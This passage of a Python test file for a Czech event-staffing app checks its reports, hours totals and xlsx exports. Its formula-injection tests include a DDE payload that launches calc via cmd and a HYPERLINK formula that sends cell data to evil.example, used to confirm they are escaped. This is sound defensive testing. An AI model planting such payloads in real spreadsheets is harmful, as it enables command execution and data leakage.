            ev = _make_event(
                me,
                "Names Akce",
                EventStatus.PUBLISHED,
                start=now - timedelta(days=1),
                end=now - timedelta(days=1) + timedelta(hours=2),
            )
            spot = EventSpot(event_id=ev.id, description="Zdravotník")
            db.session.add(spot)
            db.session.flush()
            _make_assignment(spot, member, admin)
            me_id = me.id
        _login(client, "admin_po13@test.com")
        resp = _post_printout(client, me_id=str(me_id))
        assert resp.status_code == 200
        assert resp.content_type == XLSX_CONTENT_TYPE

        sheets = _xlsx_sheets(resp.data)
        data_rows = [r for r in sheets["Přehled"][3:] if any(v for v in r)]
        assert len(data_rows) == 1
        # Column 3 (0-indexed) is the first spot column
        spot_cell = data_rows[0][3]
        assert spot_cell == "Member PO13"
        assert "Zdravotník" not in (spot_cell or "")


# ── Formula-injection sanitization ───────────────────────────────────────────


@pytest.mark.parametrize(
    "payload",
    [
        "=1+1",
        "+1+1",
        "-1+1",
        "@SUM(A1)",
        "\t=cmd|'/c calc'!A1",
        "\r=cmd|'/c calc'!A1",
    ],
)
def test_cell_escapes_formula_starters(payload):
    """cell() must prefix any formula-starter string with an apostrophe."""
    wb = Workbook()
    ws = wb.active
    _cell(ws, 1, 1, payload)
    value = ws.cell(row=1, column=1).value
    assert isinstance(value, str), f"Expected str, got {type(value)}"
    assert value.startswith("'"), f"Formula payload {payload!r} was not escaped; cell value: {value!r}"
    assert value == "'" + payload


def test_cell_leaves_safe_strings_unchanged():
    """cell() must not alter strings that don't start with a formula character."""
    wb = Workbook()
    ws = wb.active
    safe_values = ["Zdravotník", "Jan Novák", "Akce 2026", "", "100"]
    for i, val in enumerate(safe_values, start=1):
        _cell(ws, i, 1, val)
        assert ws.cell(row=i, column=1).value == val


def test_cell_leaves_non_string_values_unchanged():
    """cell() must not touch numbers, None, or other non-string types."""
    wb = Workbook()
    ws = wb.active
    for i, val in enumerate([0, 42, 3.14, None, True], start=1):
        _cell(ws, i, 1, val)
        assert ws.cell(row=i, column=1).value == val


# ── Archived events excluded from reports ─────────────────────────────────────


class TestArchivedEventsExcludedFromReports:
    def test_archived_event_excluded_from_me_report(self, app, client):
        with app.app_context():
            _make_user("admin_tr_me@test.com", "Admin TR ME", Role.ADMIN)
            me = _make_me("ME With Archived")
            _make_event(me, "Active Event", EventStatus.COMPLETED)
            ev_archived = _make_event(me, "Archived Event", EventStatus.COMPLETED)
            ev_archived.archived = True
            db.session.commit()
            me_id = me.id

        _login(client, "admin_tr_me@test.com")
        resp = client.get(f"/reports/master-event/{me_id}")
        assert resp.status_code == 200
        assert b"Active Event" in resp.data
        assert b"Archived Event" not in resp.data

    def test_archived_event_excluded_from_date_range_report(self, app, client):
        now = datetime.now(timezone.utc)
        with app.app_context():
            _make_user("admin_tr_dr@test.com", "Admin TR DR", Role.ADMIN)
            me = _make_me("ME DR Archive")
            _make_event(
                me,
                "Active DR Event",
                EventStatus.COMPLETED,
                start=now - timedelta(days=2),
                end=now - timedelta(days=2) + timedelta(hours=4),
            )
            ev_archived = _make_event(
                me,
                "Archived DR Event",
                EventStatus.COMPLETED,
                start=now - timedelta(days=2),
                end=now - timedelta(days=2) + timedelta(hours=4),
            )
            ev_archived.archived = True
            db.session.commit()

        _login(client, "admin_tr_dr@test.com")
        from_d = (now - timedelta(days=7)).strftime("%Y-%m-%d")
        to_d = now.strftime("%Y-%m-%d")
        resp = client.get(f"/reports/date-range?from_date={from_d}&to_date={to_d}")
        assert resp.status_code == 200
        assert b"Active DR Event" in resp.data
        assert b"Archived DR Event" not in resp.data

    def test_archived_event_excluded_from_user_report(self, app, client):
        with app.app_context():
            admin = _make_user("admin_tr_ur@test.com", "Admin TR UR", Role.ADMIN)
            member = _make_user("member_tr_ur@test.com", "Member TR UR", Role.MEMBER)
            me = _make_me("ME UR Archive")
            ev_active = _make_event(me, "Active UR Event", EventStatus.COMPLETED)
            ev_archived = _make_event(me, "Archived UR Event", EventStatus.COMPLETED)
            _make_assignment(_make_spot(ev_active), member, admin)
            _make_assignment(_make_spot(ev_archived), member, admin)
            ev_archived.archived = True
            db.session.commit()
            member_id = member.id

        _login(client, "admin_tr_ur@test.com")
        resp = client.get(f"/reports/user/{member_id}")
        assert resp.status_code == 200
        assert b"Active UR Event" in resp.data
        assert b"Archived UR Event" not in resp.data


class TestWorkSummaryReport:
    """Přehled výkazů — per-person / per-event hours, HTML view and xlsx export."""

    def _setup(self, app, suffix: str):
        """Create an admin, a member and a master event; return their ids/emails."""
        with app.app_context():
            admin = _make_user(f"admin_ws_{suffix}@test.com", "Admin WS", Role.ADMIN)
            member = _make_user(f"member_ws_{suffix}@test.com", "Člen Výkaz", Role.MEMBER)
            me = _make_me(f"ME WS {suffix}")
            return admin, member, me

    @staticmethod
    def _range(now: datetime) -> tuple[str, str]:
        return (now - timedelta(days=30)).strftime("%Y-%m-%d"), (now + timedelta(days=30)).strftime("%Y-%m-%d")

    def test_requires_login(self, client):
        resp = client.get("/reports/work-summary")
        assert resp.status_code == 302

    def test_form_renders_without_dates(self, app, client):
        self._setup(app, "form")
        _login(client, "admin_ws_form@test.com")
        resp = client.get("/reports/work-summary")
        assert resp.status_code == 200
        assert "Přehled výkazů".encode() in resp.data

    def test_viewer_can_open_report(self, app, client):
        """Viewer holds report.view, same as for every other report."""
        with app.app_context():
            _make_user("viewer_ws@test.com", "Viewer WS", Role.VIEWER)
        _login(client, "viewer_ws@test.com")
        resp = client.get("/reports/work-summary")
        assert resp.status_code == 200

    def test_role_without_report_view_is_refused(self, app, client):
        with app.app_context():
            _make_user("dm_ws@test.com", "DM WS", Role.DEBRIEFING_MANAGER)
        _login(client, "dm_ws@test.com")
        resp = client.get("/reports/work-summary")
        assert resp.status_code == 403

    def test_completed_paid_event_counts_as_served_and_paid(self, app, client):
        now = datetime.now(timezone.utc)
        admin, member, me = self._setup(app, "paid")
        with app.app_context():
            admin = db.session.merge(admin)
            member = db.session.merge(member)
            ev = _make_event(
                db.session.merge(me),
                "Placená akce",
                EventStatus.COMPLETED,
                start=now - timedelta(days=2),
                end=now - timedelta(days=2) + timedelta(hours=3),
            )
            ev.paid = True
            db.session.commit()
            _make_assignment(_make_spot(ev), member, admin)

        _login(client, "admin_ws_paid@test.com")
        from_d, to_d = self._range(now)
        resp = client.get(f"/reports/work-summary?from_date={from_d}&to_date={to_d}")
        assert resp.status_code == 200
        html = resp.data.decode()
        assert "Placená akce" in html
        assert "Člen Výkaz" in html

        with app.app_context():
            groups = _work_summary_data(*_parse_date_range(from_d, to_d))
            total = next(g.total for g in groups if g.total.user_name == "Člen Výkaz")
            assert total.hours_served == Decimal("3.0")
            assert total.hours_paid == Decimal("3.0")
            assert total.hours_free == Decimal("0")
            assert total.hours_planned == Decimal("0")
            assert total.hours_total == Decimal("3.0")

    def test_completed_event_uses_actual_hours_not_scheduled(self, app, client):
        """A debriefed event reports its actual duration, not the planned one."""
        now = datetime.now(timezone.utc)
        admin, member, me = self._setup(app, "actual")
        with app.app_context():
            admin = db.session.merge(admin)
            member = db.session.merge(member)
            start = now - timedelta(days=2)
            ev = _make_event(
                db.session.merge(me),
                "Protažená akce",
                EventStatus.COMPLETED,
                start=start,
                end=start + timedelta(hours=3),
            )
            # Ran an hour longer than planned.
            ev.actual_start_datetime = start
            ev.actual_end_datetime = start + timedelta(hours=4)
            ev.paid = True
            db.session.commit()
            _make_assignment(_make_spot(ev), member, admin)

            from_d, to_d = self._range(now)
            groups = _work_summary_data(*_parse_date_range(from_d, to_d))
            total = next(g.total for g in groups if g.total.user_name == "Člen Výkaz")
            assert total.hours_served == Decimal("4.0")
            assert total.hours_paid == Decimal("4.0")

    def test_unpaid_completed_event_counts_as_free(self, app, client):

        now = datetime.now(timezone.utc)
        admin, member, me = self._setup(app, "free")
        with app.app_context():
            admin = db.session.merge(admin)
            member = db.session.merge(member)
            ev = _make_event(
                db.session.merge(me),
                "Neplacená akce",
                EventStatus.COMPLETED,
                start=now - timedelta(days=2),
                end=now - timedelta(days=2) + timedelta(hours=3),
            )
            ev.paid = False
            db.session.commit()
            _make_assignment(_make_spot(ev), member, admin)

            from_d, to_d = self._range(now)
            groups = _work_summary_data(*_parse_date_range(from_d, to_d))
            total = next(g.total for g in groups if g.total.user_name == "Člen Výkaz")
            assert total.hours_served == Decimal("3.0")
            assert total.hours_free == Decimal("3.0")
            assert total.hours_paid == Decimal("0")
            assert total.hours_planned == Decimal("0")

    def test_future_event_counts_as_planned(self, app, client):

        now = datetime.now(timezone.utc)
        admin, member, me = self._setup(app, "future")
        with app.app_context():
            admin = db.session.merge(admin)
            member = db.session.merge(member)
            ev = _make_event(
                db.session.merge(me),
                "Budoucí akce",
                EventStatus.PUBLISHED,
                start=now + timedelta(days=3),
                end=now + timedelta(days=3, hours=5),
            )
            _make_assignment(_make_spot(ev), member, admin)

            from_d, to_d = self._range(now)
            groups = _work_summary_data(*_parse_date_range(from_d, to_d))
            total = next(g.total for g in groups if g.total.user_name == "Člen Výkaz")
            assert total.hours_planned == Decimal("5.0")
            assert total.hours_served == Decimal("0")

    def test_past_but_not_completed_counts_scheduled_and_is_flagged(self, app, client):

        now = datetime.now(timezone.utc)
        admin, member, me = self._setup(app, "incomplete")
        with app.app_context():
            admin = db.session.merge(admin)
            member = db.session.merge(member)
            ev = _make_event(
                db.session.merge(me),
                "Nedokončená akce",
                EventStatus.ASSIGNMENTS_CLOSED,
                start=now - timedelta(days=1),
                end=now - timedelta(days=1) + timedelta(hours=6),
            )
            _make_assignment(_make_spot(ev), member, admin)

            from_d, to_d = self._range(now)
            groups = _work_summary_data(*_parse_date_range(from_d, to_d))
            group = next(g for g in groups if g.total.user_name == "Člen Výkaz")
            assert group.total.hours_served == Decimal("6.0")
            assert group.rows[0].incomplete is True
            assert "nedokončeno" in group.rows[0].status_label

    def test_draft_cancelled_and_archived_events_excluded(self, app, client):

        now = datetime.now(timezone.utc)
        admin, member, me = self._setup(app, "excluded")
        with app.app_context():
            admin = db.session.merge(admin)
            member = db.session.merge(member)
            me = db.session.merge(me)
            for name, status in (("Koncept akce", EventStatus.DRAFT), ("Zrušená akce", EventStatus.CANCELLED)):
                ev = _make_event(me, name, status, start=now - timedelta(days=2), end=now - timedelta(days=2, hours=-3))
                _make_assignment(_make_spot(ev), member, admin)
            archived = _make_event(
                me,
                "Archivovaná akce",
                EventStatus.COMPLETED,
                start=now - timedelta(days=2),
                end=now - timedelta(days=2) + timedelta(hours=3),
            )
            archived.archived = True
            db.session.commit()
            _make_assignment(_make_spot(archived), member, admin)

            from_d, to_d = self._range(now)
            groups = _work_summary_data(*_parse_date_range(from_d, to_d))
            assert groups == []

    def test_two_spots_on_same_event_are_not_double_counted(self, app, client):

        now = datetime.now(timezone.utc)
        admin, member, me = self._setup(app, "dedupe")
        with app.app_context():
            admin = db.session.merge(admin)
            member = db.session.merge(member)
            ev = _make_event(
                db.session.merge(me),
                "Dvě pozice",
                EventStatus.COMPLETED,
                start=now - timedelta(days=2),
                end=now - timedelta(days=2) + timedelta(hours=4),
            )
            ev.paid = True
            db.session.commit()
            _make_assignment(_make_spot(ev), member, admin)
            _make_assignment(_make_spot(ev), member, admin)

            from_d, to_d = self._range(now)
            groups = _work_summary_data(*_parse_date_range(from_d, to_d))
            group = next(g for g in groups if g.total.user_name == "Člen Výkaz")
            assert len(group.rows) == 1
            assert group.total.hours_served == Decimal("4.0")

    def test_range_boundaries_use_app_timezone(self, app, client):
        """An event at 00:30 Prague on 1 Feb belongs to February, not to January.

        Picked to straddle the boundary: under the old UTC parsing this event
        fell into the January range instead, so a regression fails this test.
        """
        with app.app_context():
            # 2026-01-31 23:30Z == 2026-02-01 00:30 Europe/Prague (UTC+1).
            start = datetime(2026, 1, 31, 23, 30, tzinfo=timezone.utc)
            admin = _make_user("admin_ws_tz@test.com", "Admin WS TZ", Role.ADMIN)
            member = _make_user("member_ws_tz@test.com", "Člen TZ", Role.MEMBER)
            me = _make_me("ME WS tz")
            ev = _make_event(
                me,
                "Půlnoční akce",
                EventStatus.COMPLETED,
                start=start,
                end=start + timedelta(hours=2),
            )
            _make_assignment(_make_spot(ev), member, admin)

            in_january = _work_summary_data(*_parse_date_range("2026-01-01", "2026-01-31"))
            assert in_january == []

            in_february = _work_summary_data(*_parse_date_range("2026-02-01", "2026-02-28"))
            assert [g.total.user_name for g in in_february] == ["Člen TZ"]

    def test_swapped_dates_are_rejected(self, app, client):
        self._setup(app, "swapped")
        _login(client, "admin_ws_swapped@test.com")
        resp = client.get("/reports/work-summary?from_date=2026-03-10&to_date=2026-03-01")
        assert resp.status_code == 200
        assert "musí být před datem" in resp.data.decode()

    def test_xlsx_export_escapes_formula_starters(self, app, client):
        """Event names reach the sheet through the generic builder — still inert."""
        now = datetime.now(timezone.utc)
        admin, member, me = self._setup(app, "inject")
        payload = '=HYPERLINK("http://evil.example/"&A1,"Klikni")'
        with app.app_context():
            admin = db.session.merge(admin)
            member = db.session.merge(member)
            ev = _make_event(
                db.session.merge(me),
                payload,
                EventStatus.COMPLETED,
                start=now - timedelta(days=2),
                end=now - timedelta(days=2) + timedelta(hours=2),
            )
            _make_assignment(_make_spot(ev), member, admin)

        _login(client, "admin_ws_inject@test.com")
        from_d, to_d = self._range(now)
        resp = client.get(f"/reports/work-summary?from_date={from_d}&to_date={to_d}&format=xlsx")
        assert resp.status_code == 200

        wb = load_workbook(io.BytesIO(resp.data))
        assert wb["Výkazy"].cell(row=4, column=2).value == "'" + payload

    def test_xlsx_export_has_two_sheets_and_numeric_hours(self, app, client):
        now = datetime.now(timezone.utc)
        admin, member, me = self._setup(app, "xlsx")
        with app.app_context():
            admin = db.session.merge(admin)
            member = db.session.merge(member)
            ev = _make_event(
                db.session.merge(me),
                "Excel akce",
                EventStatus.COMPLETED,
                start=now - timedelta(days=2),
                end=now - timedelta(days=2) + timedelta(hours=2, minutes=30),
            )
            ev.paid = True
            db.session.commit()
            _make_assignment(_make_spot(ev), member, admin)

        _login(client, "admin_ws_xlsx@test.com")
        from_d, to_d = self._range(now)
        resp = client.get(f"/reports/work-summary?from_date={from_d}&to_date={to_d}&format=xlsx")
        assert resp.status_code == 200
        assert "spreadsheetml" in resp.headers["Content-Type"]

        wb = load_workbook(io.BytesIO(resp.data))
        assert wb.sheetnames == ["Výkazy", "Souhrn"]

        detail = wb["Výkazy"]
        header_row = 3
        data = [c.value for c in detail[header_row + 1]]
        assert data[0] == "Člen Výkaz"
        assert data[1] == "Excel akce"
        # Hours must be real numbers so Excel sums them in any locale.
        assert isinstance(data[4], (int, float))
        assert data[4] == pytest.approx(2.5)
        # Datum must be a real date cell, not a preformatted string.
        assert isinstance(data[2], (datetime, date))
        assert detail.cell(row=header_row + 1, column=3).number_format == "DD.MM.YYYY"
        assert detail.auto_filter.ref is not None

        summary = wb["Souhrn"]
        totals_row = [c.value for c in summary[header_row + 2]]
        assert totals_row[0] == "Celkem"
        assert totals_row[1] == pytest.approx(2.5)
